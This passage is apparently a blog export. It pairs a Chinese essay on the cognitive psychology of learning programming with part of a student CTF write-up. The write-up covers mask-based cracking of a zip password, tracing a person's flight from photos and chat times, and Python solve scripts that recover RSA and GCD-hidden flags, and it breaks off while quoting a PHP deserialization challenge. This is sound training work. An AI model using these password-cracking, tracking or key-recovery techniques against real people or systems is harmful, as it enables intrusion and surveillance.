工作记忆是有限的，它的容量在人们出生时大致是固定的。虽然较高的工作记忆容量与较高的智力有关，但工作记忆容量并不是最重要的因素。较高的容量使得学习更快，但是无限的长期记忆消除了我们最终能够学习多少的限制。程序员可能有较低或较高的工作记忆容量，但是，长期记忆的内容使他们成为专家。 随着人们对一个主题了解的内容越来越多，他们把信息联系在一起，形成一个个信息块，允许多个信息块作为工作记忆中的一个信息块。例如，当面对一个电子邮件地址时，一个熟悉的 gmail.com被视为一条信息，而不是随机字符串。因此，信息块越多，工作记忆就越大。与计算机类比，我们的工作记忆类比为CPU 寄存器，可能只允许在长期记忆&#x2F;磁盘中存储5个指向信息块的指针，但是对于信息块的大小没有限制，所以最佳策略是通过练习使用信息和解决问题来增加信息块的大小，这或许就是建立自己知识体系的意义。 当学习新的工具或技能时，了解任务所要求的认知负荷或工作记忆容量很重要。认知负荷分为内部负荷和外部负荷。内部负载是指完成任务所必需的信息或块的数量; 除非通过更改任务，否则不能更改内部负载。相比之下，无关的认知负荷是不必要的信息，然而，是执行任务的一部分。表达是外部认知负荷如何变化的一个例子，如果正在实现一个数据库模式，那么使用带有表和属性的图比使用简单的英语描述更容易，后者具有更高的外部负载，因为我们需要在心理上将描述转换为模式，而图可以直接映射，对于初学者来说，外部负载通常较高，因为他们不能很容易地区分内部信息和外部信息。 当面对一项超出个人能力范围的任务时，重要的是要认识到这可以通过重新组织任务来改变。将问题分解成可以处理的小块，最终将允许人员解决复杂的问题。这个原则可以应用到自己的实践中，但是当与初级开发人员和新人一起工作时，这个原则尤其重要。 3. 专家认知与初学者推理初学者和专家之间的一个关键区别是，专家以前见过类似的情况。对象棋高手而言，他们的主要优势是记忆和识别棋盘状态的能力。这使得他们能够决定如何更快更省力地做出反应。有人将认知分为“系统1”和“系统2”，系统1速度快，由识别驱动，依赖于长期记忆中的模式识别，而系统2速度慢，专注于推理，需要更多的工作记忆处理。这是双过程理论的一部分。 软件工程师可以通过记住程序代码中的常见模式来进行更高层次的推理，这释放了他们的认知能力。这种情况的一个实例是编程中的“设计模式”，类似于之前讨论的信息块。一个专家可能会立即意识到某段代码正在执行一个排序算法，而初学者可能会逐行阅读，试图理解代码的工作原理，而不会注意到整体情况。 这种情况的一个必然结果是，初学者可以通过阅读和理解大量代码而成为专家。专家们建立了一个模式的心智模型，让他们在将来更容易地读写代码，因此，学习各种编程范例将有进一步的帮助。总的来说，阅读并使用更多代码以及理解更多类型的代码是能够提高编程水平的原因。 4.理解概念从抽象到具体再到回归高手处理概念的方式与初学者不同，他们使用通用和抽象的术语来寻找基础概念，而不是关注细节，而初学者往往关注表面的细节，很难将这些细节与更大的背景联系起来。这些差异不仅影响专家的推理方式，也影响他们的学习方式。 例如，当向一个新手解释 Python 中可变参数的函数时，高手可能会说，这是一个可以接受不同数量参数的函数。初学者可能会关注一些细节，比如声明和调用函数的确切语法，并可能认为只传递一个参数是一种特殊情况。高手可能更容易理解或预测的细节，通过概念来解释。 当学习一个新概念时，可以从两种形式的解释中受益: 抽象的特征和具体的例子细节。具体而言，我们将受益于所遵循的语义。遵循语义，我们可以不断地在抽象定义和概念的几个不同示例之间切换。例子越多样化越好。与正确的例子相比，错误的例子也能帮助我们理解错误的原因，比如在试图了解常数是什么的时候，可以观测到一个变量被标记为非常数，这一过程称为拆包。 通过这些不同的示例，我们可以(重新)访问抽象定义，并构建对概念的更深入理解。更深入的理解源于认识到多个例子中的细节是如何连接到定义中的一个抽象概念的，这个过程称为重新包装。解决问题被(错误地)认为是一种通用的技能。然而，这并不是解决问题在大脑中的工作方式。 编程经常涉及到学习抽象概念。面对一个需要学习的抽象概念，比如函数，人们经常需要具体的概念实例来检查，比如，返回一个数字的绝对值函数——abs 。一个挑战是，随着概念变得更加抽象(从值到变量&#x2F;对象到函数&#x2F;类到高阶函数&#x2F;元类，最终到范畴理论) ，距离具体的例子越来越远。可取的是，当学习抽象概念时，它们对我们来说变得更加具体。最初，函数是一个抽象的概念，但是经过大量的实践，函数对我们来说变成了一个具体的代码块 ，进而可以学习下一个抽象层次。 5. 间距和重复问题都听说过不应该临时抱佛脚来应付考试，这个建议是基于认知心理学中最可预测和持久的效应之一: 间隔效应。根据间隔效应，人们通过在多个练习阶段、多天、最理想的是多周间隔练习来学习解决问题的概念。 间隔效应的机理是基于长期和工作记忆之间的关系。当练习解决问题的时候，一般练习两种技能，将问题中的信息与可以解决问题的概念匹配，然后应用该概念来解决问题。第一个技能需要激活通往长期记忆概念的正确神经通路。如果学习者反复解决同一类问题，比如 for-each 循环，那么通往长期记忆的通路就会保持活跃，他们就会错过练习第一个技能的机会。无间隔练习的一个常见结果是，人们可以解决问题，但需要被告知使用哪个概念时才能解决。虽然交织不同类型的问题可能有所帮助，如循环和条件判断，使用间隔学习有必要获得最多的练习时间。此外，大脑需要休息，以巩固新的信息，以便它可以应用于新的问题。 密集的编码训练营要求学习者将解决问题的练习塞进没有间隔的会话中，虽然这并不理想，但大多数学习者仍然喜欢把他们的练习塞进尽可能少的时间里。如果强化训练营是学习编程的唯一可行选择，可以应用间隔效应来最大化学习成果。 为了安排一天的学习时间，应该把学习时间限制在90分钟或更少。大脑中的神经化学平衡使得在这一点之后注意力难以集中。每次学习后，至少花20分钟休息。真正的休息是散步或安静地坐着，不做其他任务，无所事事地浏览互联网，或与他人聊天。休息加速了巩固过程，这也发生在睡眠期间。 有几种策略可以使学习效率最大化。首先，把解决问题的顺序随机化，这样不同的概念就会在长期记忆中被激活。但是要注意的是，随机化的顺序可以提高学习效果，但是需要更多的努力。第二个策略是在随机的时间间隔中进行短暂的休息，以增强记忆巩固。建议每2-5分钟休息10秒钟。 6. 互联网并没有使学习过时随着互联网的普及，编程知识的获取方式发生了很大的变化。有关语法或 API 的知识从参考书中浏览变成了只需要敲几下键盘。最近，像 ChatGPT、 Codex 和 GitHub Copilot 这样的人工智能工具甚至会为我们填写这些细节，而且大部分是准确的。这就提出了一个显而易见的问题: 如果知识可以在几秒钟内从互联网上获得，为什么还要学习编程的细节呢 ？ 我们通过在长期记忆中储存知识片段并在它们之间建立联系来学习。如果知识不存在于大脑中，大脑不能在它们之间建立任何联系，所以更高层次的理解和抽象是不可能的。如果每次需要一段代码来做一个数据库连接，就在网上搜索并复制，然后继续，你将不太可能学到很多关于数据库连接的知识。依赖互联网或人工智能的智慧在初学者和专家之间是不同的: 一个初学者从未学习过细节，因此缺乏记忆联系，而一个专家学习过更深层次的结构，但是寻找被遗忘的细节，这两者之间有着关键的区别。 在互联网上搜索记忆信息的效率较低，一项研究发现，如果信息是通过互联网找到的(与纸质书相比) ，记忆力就会下降，似乎搜索可能会剥夺大脑回忆信息强化效应的好处。还有前面的认知负荷问题。互联网搜索需要一种大脑上下文切换的形式; 它有限的注意力和工作记忆必须从手头的任务(编程)切换到一个新的认知任务(搜索互联网并选择一个结果或评估人工智能生成的结果)。如果所需的知识被记住，那么不仅访问速度更快(比如使用缓存和从硬盘获取) ，而且还避免了上下文切换的认知流失以及从搜索中过滤掉无关信息。因此，尽管信息可以在互联网上获得，但是记忆信息还是有很多原由的。 7. 解决问题并不是一个通用的技能解决问题是编程中的一个很大的部分。软件开发中一个常见的想法是将问题解决作为一种特定的技能，然后将其应用于开发的不同方面(设计、调试等)。因此，解决问题被错误地认为是一种通用的技能。然而，这并不是解决问题在大脑中的工作方式。 虽然人类确实拥有一些通用的问题解决技能，但它们远不如特定领域的问题解决技能(如能够调试程序)有效。虽然我们可以学习推理，但是不能学习如何解决一般的问题。相反，我们学习如何解决编程问题，或如何计划最好的流程，或如何创建一个设计模式。每一项技能都是独立的，不会影响其他技能。这种无法转移解决问题的技能说明了“大脑训练”对发展一般智力的开发可能是无效的。 这条规则的一个例外似乎是空间技能。空间技能使我们能够在头脑中想象物体，比如俄罗斯方块的形状，并在头脑中操纵这些物体，比如旋转俄罗斯方块的形状。训练这些通用技能可以改善其他学科的学习。这种现象是很不寻常，空间训练提高了一系列非语言技能的表现，可以提高软件开发人员的效率。即使有这个奇怪的例外，学习如何解决编程问题的最好方法仍然是练习解决编程问题，而不是学习下棋或其他。 这里还有一个招聘上的意义。筛选程序员候选人的一个流行想法是给出一些脑筋急转弯的谜题，比如如何称一架大型喷气式客机的重量。正如谷歌在2013年发现的那样，这是在浪费时间，脑筋急转弯世界中的问题解决与编程世界中的问题解决之间没有可靠的对应关系。如果想判断编程能力，就要直接评估编程代码。 8. 专业知识在某些情况下可能会出问题专业知识有利于学习和性能的许多方面，然而，成为专家也会导致问题。 程序员使用工具来提高效率，例如版本控制系统或 IDE。这些工具对初学者和专家有不同的影响。由于认知负荷的增加。初学者可能会被专业工具中的大量选项弄得不知所措，并且可能会从初学者友好的关于如何使用工具的提示中受益。然而，专家们发现同样的提示更让人分心，而不是有用。这就是所谓的专业知识反转效应: 帮助初学者的提示和指南可能会妨碍专家的工作，降低他们的工作效率。 程序员通常在整个职业生涯中学习多种编程语言。一旦掌握了多种语言，了解多种语言可能是有益的，但有时将知识从一种编程语言转移到另一种编程语言可能会导致错误的知识。例如，在学习OOP继承的时候，在 Java 中，只要签名匹配，一个方法就会重写父方法，然后将这些知识传递给 C + + ，在 C + + 中，重写父方法还需要将父方法声明为虚方法。这些差异在句法上相似，但语言之间在语义上的不同阻碍了知识的转移。 专家经常会帮助初学者，但是没有培训经验的专家往往没有意识到初学者的想法是不同的。因此，他们无法为具有不同思维模式的人量身定制做解释。这就是所谓的专家盲点问题: 一旦成为专家，就很难通过初学者的眼睛来看待事物。可以通过仔细听初学者解释他们目前的理解并相应地裁剪解释来克服这个问题。 然而，有时候，知识变得令专家们很难用语言来表达它。在这些情况下，初学者可能更好地从支持初学者的教学材料中学习，或者从同行那里学习。一个相对于新手更有知识的同行是一个非常有价值的资源，可以帮助初学者开发新知识，帮助专家重新发现直觉知识，弥合初学者和专家之间的差距。 9. 编程能力的预测因素尚不清楚像大多数活动一样，学习编程的成功建立在内在天赋和实践的结合之上。有些人认为这纯粹是天资问题，还有一些人认为，这几乎完全是实践问题，“10000小时”的观点认为，只有充分的实践才能获得专业知识。这两种极端的观点都是错误的。 对编程能力进行预测性测试的尝试通常都以失败告终。编程能力测试始于20世纪60年代，预测的准确性很差，这些测试已经不再使用。 经验的重要性与实践有关，这方面好坏参半。在Stack Overflow 上，程序员的声誉与他们的年龄有关联，年长者的声誉更高。然而，在职业生涯相对较早的程序员中，多年的经验和编程任务的成功之间只有很弱的联系，这表明能力可能比经验更有效，至少在程序员的职业生涯早期。 和大多数领域一样，有两个因素不能很好地预测早期编程的成功，这两个因素是一般智力水平和工作记忆能力。这些因素大致代表推理能力和学习者一次能处理多少信息。因此，他们预测的是学习速度而不是绝对能力。这两个因素的一个次级指标，空间推理是编程成功的一个较强的预测因子。空间推理也可以预测其他科学和数学领域的成功，所以这不是编程特有的。此外，由于各种原因，随着经验的增加，这些弱到中等程度的相关性基本上消失了。因此，聪明的人并不总是能成为优秀的程序员，优秀的程序员不一定具有很高的智商水平。 简而言之，很难预测谁将能够编程，程序员可能来自任何背景或人口统计，而且与任何其他因素的联系在面对经验时通常是转瞬即逝的。因此，在招聘新程序员时，没有确定编程能力的捷径。 10. 心态很重要在编程能力中有一个长期存在的说法：要么能编程，要么不能。这背后有许多相互矛盾的理论。其中一个更引人注目的理论是学习优势动量的概念，每个主题都依赖于以前的主题，所以一旦落后了，你将很难赶上。一个不那么引人注目的理论是“极客基因”概念，它没有什么经验证明。最近开始把编程能力的差异理解为先前经验的差异。看起来相似的学习者可能拥有截然不同的知识和技能，使他们在学习优势方面领先或落后，或者在短时间内使他们看起来“与生俱来”。 几乎每个人都可以学习一些物理，即使他们一开始并不擅长。然而，几乎没有人能够获得诺贝尔物理学奖，无论他们多么努力地练习。在这两个极端之间，我们经常试图找出自己能力的边界。 很难改变一个人的心态，使其更加以成长为导向。有两个常见错误观念，第一个是奖励努力而不是表现，因为成长心态更喜欢实践而不是才能。但是学习者并不愚蠢，他们可以看出自己什么时候没有进步，表扬徒劳的努力是没有帮助的。相反，只有当学习者使用有效的策略并在通往成功的道路上时，努力才会得到回报。第二个误解是当一个人带着成长心态处理一项任务时，他们会在整个任务过程中保持这种心态。在现实中，当我们面对挫折和经历失败时，我们不确定自己的能力界限在哪里。因此，我们必须练习克服挫折和失败，以保持成长的心态。 目的导向分为两类: 接近和回避。“接近”是想要做好，这会产生积极有效的学习行为: 努力学习，寻求帮助，尝试新的富有挑战性的课题。相比之下，“回避”是避免失败，这会导致消极和无效的行为: 无组织的学习，不寻求帮助，对表现的焦虑，以及回避挑战。需要注意的是，如果被指向“接近”而不是“回避”，人们可以在没有严重惩罚的情况下犯错误。 当学习一项新技能或训练某人掌握一项新技能时，以成长心态处理任务是有效的，也是一项需要发展的技能。不幸的是，不能简单地告诉人们要有成长的心态并从中获益。相反，需要通过寻求或提供关于学习过程和策略有效性的真实反馈来培养这种技能。感到沮丧是正常的，但这并不意味着你总是感到沮丧。如果你想放弃，休息一下，散散步，考虑一下你的策略，然后再试一次。 小结软件工程师必须不断学习，以跟上该领域的快速变化。学习任何东西，包括编程，都需要将内容放到记忆中。人的记忆非常复杂，虽然与计算机体系结构有一些相似之处，但是有一些关键的差异使得它的工作方式完全不同。 就招聘而言，如果你想知道应聘者的编程水平，看看他们以前的工作或者在真正的编程任务上测试他们，不要用脑筋急转弯来测试候选人。至少在年轻的开发人员中，多年的经验可能不是衡量能力的可靠指标。让求职者在提出解决方案之前，先自己在一个房间里解决面试问题，因为面试官在解决问题时观察或要求谈话会增加认知负荷和压力，从而影响表现。 就学习而言，阅读大量的代码可以帮助人们成为一个更有效率的程序员。专家并不总是最擅长培训初学者。学习需要时间，临时抱佛脚没有效果，但间隔重复有效。同样，花时间远离一个问题或许可以帮助解决这个问题。互联网搜索或AIGC工具可以提高工作效率，但并不意味着学习已经过时。使用例子在抽象概念和具体可学习的事实之间切换。寻求成功而不是避免失败)，并相信能力是可变的，这些都是学习进步的重要因素。 话外音学习的重要性毋庸置疑，软件编程能力的提升需要学习与实践，软件架构能力的提升也是如此。多学习一些软件系统的架构有助于更好地对架构设计进行决策。","categories":[{"name":"杂谈","slug":"杂谈","permalink":"https://incldue.github.io/categories/%E6%9D%82%E8%B0%88/"}],"tags":[{"name":"哲思","slug":"哲思","permalink":"https://incldue.github.io/tags/%E5%93%B2%E6%80%9D/"}]},{"title":"XAUT2025全国大学生信息安全竞赛新生预选赛-个人WP","slug":"XAUT2025 全国大学生信息安全竞赛新生预选 赛-WP","date":"2025-01-20T16:00:00.000Z","updated":"2025-09-27T13:50:05.114Z","comments":true,"path":"2025/01/21/XAUT2025 全国大学生信息安全竞赛新生预选 赛-WP/","permalink":"https://incldue.github.io/2025/01/21/XAUT2025%20%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E6%96%B0%E7%94%9F%E9%A2%84%E9%80%89%20%E8%B5%9B-WP/","excerpt":"打了学校的校赛，拿了这届新生的NO.1，险胜，以下为个人部分WP...","text":"作者： debu8ger 队伍： GeekPwn02 总排名： 5 排名： 1 得分： 2563 MISC SignIn 题目描述： %58%41%55%54%43%54%46%7B%57%65%31%63%30%6D%65%5F%74%30%5F%58%41%55%54 %43%54%46%7D 直接拿到随波逐流里一把梭得到 flag try 题目描述：黑客意外获得了 Peng 常用密码的前 5位 13897 ，但不知道具体的位数，请你尝试恢复出完整 的密码。 下载附件后， zip 文件加了密，拖到 ARCHPR 里。 根据题目描述，联想到用掩码 ,设置掩码为 13897??? ，不断尝试密码位数，最后为 13897?????? ，得出密码 为13897564231 。 用密码得出 flag 沙滩，海洋，大冒险！ 题目描述： “Play, play, and a little competition ！” 一到假期， BR 就迫不急待跑出去玩了！可恶，校赛题还没有出完呢，这怎么能行？！ BR 不愿意透露自己去哪里玩了，但是我们通过一些社会工程学手段打听到了一些信息。 现在你需要基于题目附件给出的提示推断出 BR 去哪里玩了，并且找到 BR 出发时 乘坐的那一班飞机！ flag 为： XAUTCTF{ 搭乘的飞机航班号 } 示例：假如搭乘的是 1月31 日07:00-09:15 从北京首都国际机场飞往上海浦东国际机场的东航 MU5100 ，则flag 为： XAUTCTF{MU5100} 附件下载后是几张图片，根据图片里的 “南沙湖景区 ”，在浏览器搜索得出在汉中的飞机场，再根据聊天记 录中的时间 1.7 出发， 22 ：50 的飞机得出航班为 GX8898 Crypto开心解方程 题目描述：解方程谁不会啊！我靠，这么大的数！ 下载附件后打开： from Crypto.Util.number import * from flag import real_flag import random def get_random_number(): return random.randint(10**1000,10**1001) a = bytes_to_long(real_flag) b = get_random_number() c = get_random_number() d = get_random_number() n1 = a*b n2 = b*c n3 = c*d print(f&quot;n1 = &#123;n1&#125;&quot;) print(f&quot;n2 = &#123;n2&#125;&quot;) print(f&quot;n3 = &#123;n3&#125;&quot;) print(f&quot;d = &#123;d&#125;&quot;) &quot;&quot;&quot;n1 = 660450239937627676472423152753088762866493652912175035499026181480010556008370227 132820692782941399020078286652999758917091413843420294288183682337794567181698378 005190614956144552666986460330953742492949504762378684649291608293382476170196507 203860717478415630531428751980788146515223279726281602812659703309762797436048496 627911598377385262782778046800188003103442375618916707142674221670302396972922283 520054905593166294022196546718266472584050053300607686206198014313391408445437435 461419478264326992928539518498208034077320792110599071386379968059173966168861863 310563929045344315395731430000393330742178273782030232137271829338224042312738785 152236946900306968280222576625839634537180837030960604009475268281037277121979859 481286561762653987805286800510140743673637571353114984679475017659746968187968573 057934009318669305996594873342826450526329996481608343739819045332409118504519002 207477400866719610003935048350194103918864656918681643952118946067692088906775185 346231362247690338142322966940992512356418386457476687916237422414439983444353705 38812516231728525148001841752921696848750 n2 = 132055559948771408099604477174510908640912495019380611591004400217163913272136993 624283235079308020015173158191553338936753084171134908531165485921070874516834813 976117599430837900823335294479519533702907533849170522341798957404618239390485873 877756550985342946026048577994521995745243228888275945684197374335095889775900584 018493535693551635367739929894727124030411094267858058173324359095354142826060871 855025402896480786226652143721749604469688715048143841581073559139793591057386368 662003982514297359734502803119229221447469362191444625907240976754170723813555216 696259448226530794490426262235682192406211548384519179216913469272608133976730073 740693350965705743473429521428183071140252726519187867319209698168797844265454686 604650858647625651544844781172441114327730413909755610663851775805294677760337341 471874320104145726238738815997034116160241320481623424055329647756212404950138137 201755652092058647070154954508993527680392400884226430281062546126537770580183644 562443912059541003914708424230090569341055501736533553073746674313903992403503206 857916767617208494549796807961852733026405952427948517952448304611149342659684628 569240855038143599794523207383276344355059600817779494420269353407710918628882281 209710568248306625094302589083556130775420236298436946727954741207366382680753425 658694529323561705425881551718193904002607996920204879424398104325533927369289415 066917692493833507884186060259837106601569745744140016374319263631306625671259175 725749415499428033183980555918740839725077368686680281827054943319958962854368269 697061677855152125336416555541049194632983874540006015609081285573904886020380480 815939450727082808598371168705113292836650171896662288041545378376290705384280571 907349030484957785736384072797454874730966709528617139563145541483208207493168201 036502003863127289159200256458071082412659606747201219742648312696937511042470016 665970393829748900730673247488465176447873096543614566319875241944650936502266014 7218357448783598847793577903599742398436141520668329522500n3 = 249410272713998803165754891640007600846974535132227413971910865147969418539888390 073195689606460962553558928312743817847989934263100229022376128133508659027145332 511026307508686380224842234337426552003909228705197467042081026039559458721425938 098730849518727610240511003769836456879846902229417814578214601487649676894922723 462954711576107249045920865021523357612453775914962100509145273182613952283062735 895326241387273776619073614869159145539227349333374466068545601681226017756778478 970656850557932065579658939902181207185042720135934511308625418584279218810969482 187360886196754252103439195563518876634644835852209538418218191912157245441621484 746534825636136256651467843529859284555352243328258765980117242641670660964203471 733964221141765428089495089015946263582880444097689977702505016847310236571510768 439660043606739100605659424426677991950824300152769387504462598723123583198993392 920491550064242470431710380838595074587484332709028700667374217858019338913770751 233780840991911748572040679879955312564101137264045108984589666328288716593695705 628987313346676289541168447603290206899000688718335042566310836818080249745939265 766878889098243823775754170428574336166853448019828193151415593388977747007521853 462627419876286500597076433888660170265722292820282769078749796486423267732929410 579782033440976060073930532384320862660899912815510485687067091261411753169539876 689833347677430308001021169722778003692862579513640957940092905357037836527451598 294841312550447400930034141425085131602165292124625826119147029246119569825071322 961239430304131377656956479972476980119731750167986534701212222821155552705687935 372081227591635388891661558276169595275715422113441207510282320593295030888415098 837302380595809009588072616229131468353596837635562957862923207068829417296231130 002134233287119398969022114042157048675352691161235874217937559447389382292290724 611250564692584551972664442684936608785858133466701256968233101458604112191821224 2373332106875529757752615031856738830163693909495716952252 d = 433649372657589561562736809113004896168988647467520522913503121627765152775872617 601174780309978948487118630623329285993553677703405155275957279564069754922608153 154985338337687221891537104845929137385323656737740520069497836713892798151396178 503110905146427254229932668338319430728026724929326990940122153602546409602279757 590528474512032428065493660727706292350992848548454374097053296992399965219450980 279948354644467259044536527730448427845444122562421182834303885763776785213056778 206306776574403086432100135804575686894687978437505218130338350044882355907368727 497314999595347129061253373714169034744396871198566741632582508619413746765301690 848796950206844814814100377730903357480581057890708058699990419019558244478361014 643171912366628244865206104432518650743908058177170171276657980747433307972075558 617764047083267897091305898360989080598358610366787147875243647574664400539203394 508901718521693792584822114894193675290489292453184418407413481891188937735907286 65799522362650234927535765626 &quot;&quot;&quot; 通过代码审计，看到 n1 、n2 ，n3 已知，上面的 b、c、d是生成的随机数， n1 和n2 、n3 则是它们相乘，可 以用 GCD 算法逆向得出 a，即为真正的 flag 。 得出 exp ： from Crypto.Util.number import * from math import gcdn1 = 660450239937627676472423152753088762866493652912175035499026181480010556008370227 132820692782941399020078286652999758917091413843420294288183682337794567181698378 005190614956144552666986460330953742492949504762378684649291608293382476170196507 203860717478415630531428751980788146515223279726281602812659703309762797436048496 627911598377385262782778046800188003103442375618916707142674221670302396972922283 520054905593166294022196546718266472584050053300607686206198014313391408445437435 461419478264326992928539518498208034077320792110599071386379968059173966168861863 310563929045344315395731430000393330742178273782030232137271829338224042312738785 152236946900306968280222576625839634537180837030960604009475268281037277121979859 481286561762653987805286800510140743673637571353114984679475017659746968187968573 057934009318669305996594873342826450526329996481608343739819045332409118504519002 207477400866719610003935048350194103918864656918681643952118946067692088906775185 346231362247690338142322966940992512356418386457476687916237422414439983444353705 38812516231728525148001841752921696848750 n2 = 132055559948771408099604477174510908640912495019380611591004400217163913272136993 624283235079308020015173158191553338936753084171134908531165485921070874516834813 976117599430837900823335294479519533702907533849170522341798957404618239390485873 877756550985342946026048577994521995745243228888275945684197374335095889775900584 018493535693551635367739929894727124030411094267858058173324359095354142826060871 855025402896480786226652143721749604469688715048143841581073559139793591057386368 662003982514297359734502803119229221447469362191444625907240976754170723813555216 696259448226530794490426262235682192406211548384519179216913469272608133976730073 740693350965705743473429521428183071140252726519187867319209698168797844265454686 604650858647625651544844781172441114327730413909755610663851775805294677760337341 471874320104145726238738815997034116160241320481623424055329647756212404950138137 201755652092058647070154954508993527680392400884226430281062546126537770580183644 562443912059541003914708424230090569341055501736533553073746674313903992403503206 857916767617208494549796807961852733026405952427948517952448304611149342659684628 569240855038143599794523207383276344355059600817779494420269353407710918628882281 209710568248306625094302589083556130775420236298436946727954741207366382680753425 658694529323561705425881551718193904002607996920204879424398104325533927369289415 066917692493833507884186060259837106601569745744140016374319263631306625671259175 725749415499428033183980555918740839725077368686680281827054943319958962854368269 697061677855152125336416555541049194632983874540006015609081285573904886020380480 815939450727082808598371168705113292836650171896662288041545378376290705384280571 907349030484957785736384072797454874730966709528617139563145541483208207493168201 036502003863127289159200256458071082412659606747201219742648312696937511042470016 665970393829748900730673247488465176447873096543614566319875241944650936502266014 7218357448783598847793577903599742398436141520668329522500n3 = 249410272713998803165754891640007600846974535132227413971910865147969418539888390 073195689606460962553558928312743817847989934263100229022376128133508659027145332 511026307508686380224842234337426552003909228705197467042081026039559458721425938 098730849518727610240511003769836456879846902229417814578214601487649676894922723 462954711576107249045920865021523357612453775914962100509145273182613952283062735 895326241387273776619073614869159145539227349333374466068545601681226017756778478 970656850557932065579658939902181207185042720135934511308625418584279218810969482 187360886196754252103439195563518876634644835852209538418218191912157245441621484 746534825636136256651467843529859284555352243328258765980117242641670660964203471 733964221141765428089495089015946263582880444097689977702505016847310236571510768 439660043606739100605659424426677991950824300152769387504462598723123583198993392 920491550064242470431710380838595074587484332709028700667374217858019338913770751 233780840991911748572040679879955312564101137264045108984589666328288716593695705 628987313346676289541168447603290206899000688718335042566310836818080249745939265 766878889098243823775754170428574336166853448019828193151415593388977747007521853 462627419876286500597076433888660170265722292820282769078749796486423267732929410 579782033440976060073930532384320862660899912815510485687067091261411753169539876 689833347677430308001021169722778003692862579513640957940092905357037836527451598 294841312550447400930034141425085131602165292124625826119147029246119569825071322 961239430304131377656956479972476980119731750167986534701212222821155552705687935 372081227591635388891661558276169595275715422113441207510282320593295030888415098 837302380595809009588072616229131468353596837635562957862923207068829417296231130 002134233287119398969022114042157048675352691161235874217937559447389382292290724 611250564692584551972664442684936608785858133466701256968233101458604112191821224 2373332106875529757752615031856738830163693909495716952252 d = 433649372657589561562736809113004896168988647467520522913503121627765152775872617 601174780309978948487118630623329285993553677703405155275957279564069754922608153 154985338337687221891537104845929137385323656737740520069497836713892798151396178 503110905146427254229932668338319430728026724929326990940122153602546409602279757 590528474512032428065493660727706292350992848548454374097053296992399965219450980 279948354644467259044536527730448427845444122562421182834303885763776785213056778 206306776574403086432100135804575686894687978437505218130338350044882355907368727 497314999595347129061253373714169034744396871198566741632582508619413746765301690 848796950206844814814100377730903357480581057890708058699990419019558244478361014 643171912366628244865206104432518650743908058177170171276657980747433307972075558 617764047083267897091305898360989080598358610366787147875243647574664400539203394 508901718521693792584822114894193675290489292453184418407413481891188937735907286 65799522362650234927535765626 b = gcd(n1, n2) a = n1 // b c = n2 // b real_flag = long_to_bytes(a) print(f&quot;THE real_flag: &#123;real_flag.decode()&#125;&quot;) 即可得到 flag 。 ezRSA 题目描述：这伞兵 BR 又出了什么抽象题？忍不了了！和 BR 爆了！！！ 下载了附件后是 txt 文件，打开： e &#x3D; 65537 n &#x3D; 33896169649278787817413108531913159564802588344171700864708498661924206927271997490 45136855692986896313375718348538743048229582847210725029529834835813548058842302356 16224853229739254453896448014605235889565579360332680381264108519019900566994903905 05881187230673778366514722844167243102886788304917509722252674263436525922913096000 98944351229749957513453626264488620799659160485560680576771242990157 dp &#x3D; 40008312476670176077019320150135078093576233427810327258745387563367163532724088700 44433889118362883630676972295465773710150675576341453713705665281129523531268017856 3283946769876556761670653862586533 c &#x3D; 27517927422383474443348354524600841867994530350599275770033259060956283813207152505 38921636436471076761144030529733555087963190221733614651048234326074859224867616661 30746018102996787411650068046965914585541239006719172052235204702773905192301423559 48361827142449434679837060411450431072294284607048332335596884831364971047377659128 20183578092203043788325533521188107197615771966434225751684425810745 通过分析，已知公钥指数 e、模数 n、解密指数 dp 和密文 c，要得到明文。利用 RSA 知识 dp&#x3D;d mod(p−1) ， 找到 p后，可以得到 q，计算 phi(n) 和d， 最后利用中国剩余定理解密 c 写exp ： from Crypto.Util.number import inverse, isPrime, long_to_bytes e = 65537 n = 338961696492787878174131085319131595648025883441717008647084986619242069272719974 904513685569298689631337571834853874304822958284721072502952983483581354805884230 235616224853229739254453896448014605235889565579360332680381264108519019900566994 903905058811872306737783665147228441672431028867883049175097222526742634365259229 1309600098944351229749957513453626264488620799659160485560680576771242990157 dp = 400083124766701760770193201501350780935762334278103272587453875633671635327240887 004443388911836288363067697229546577371015067557634145371370566528112952353126801 78563283946769876556761670653862586533c = 275179274223834744433483545246008418679945303505992757700332590609562838132071525 053892163643647107676114403052973355508796319022173361465104823432607485922486761 666130746018102996787411650068046965914585541239006719172052235204702773905192301 423559483618271424494346798370604114504310722942846070483323355968848313649710473 7765912820183578092203043788325533521188107197615771966434225751684425810745 for k in range(1, e): p = (e * dp - 1) // k + 1 if (e * dp - 1) % k == 0 and isPrime(p) and n % p == 0: q = n // p if isPrime(q): break phi = (p - 1) * (q - 1) d = inverse(e, phi) dq = d % (q-1) m_p = pow(c, dp, p) m_q = pow(c, dq, q) h = (inverse(q, p) * (m_p - m_q)) % p m = (m_q + h * q) flag = long_to_bytes(m).decode() print(&quot;解密后的flag:&quot;, flag) 得到 flag private key 题目描述：众所周知，公钥加密，私钥解密，那么没有私钥，这怎么解密？ hint: 私钥生成所需要的 p，q如何从公钥的 n中获得呢？ 下载附件得到三个文件： attachment.py 、flag.enc 和public_key.pem ，这个题是已知公钥，无私钥，则我们要得到私钥后才能解密 flag.enc ，放到 kali 中, 可以看到已得出了 private_key.pem ，但是用 kali 自带的貌似解出来不对， 于是我用 python 写了一段解密 exp ： from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_OAEPdef dec(): private_key = RSA.importKey(open(&#x27;private.pem&#x27;, &#x27;r&#x27;).read()) rsa_decryptor = PKCS1_OAEP.new(private_key) with open(&#x27;flag.enc&#x27;, &#x27;rb&#x27;) as fp: encrypted_data = fp.read() decrypted = rsa_decryptor.decrypt(encrypted_data) print(&quot;解密后的 flag:&quot;, decrypted.decode())dec() 得出 flag Webunser 题目描述：小李是一位初学编程的小伙子，刚接触一种新语言。他发现这门语言操作数据的方式很特 别，可以把复杂的信息转化为看似简单的文本，又能轻松恢复成原来的样子。 为了练习，他写了一个小程序，记录好友的名字和生日。小李把这些信息转换成一个奇怪的格式保存起 来。几天后，他用程序还原了这些数据，发现好友的生日一条不少。他很开心，觉得自己迈出了学习的 第一步。 这次成功让小李充满信心，他开始觉得学编程并没有想象中那么难嘛！ 得到题目实例： &lt;?phphighlight_file(__FILE__);include(&quot;flag.php&quot;);class login&#123; public $user; public $pass; function __construct($user,$pass)&#123; $this-&gt;user=$user; $this-&gt;pass=$pass; &#125; function login()&#123; if ($this-&gt;user==&quot;admin&quot; and 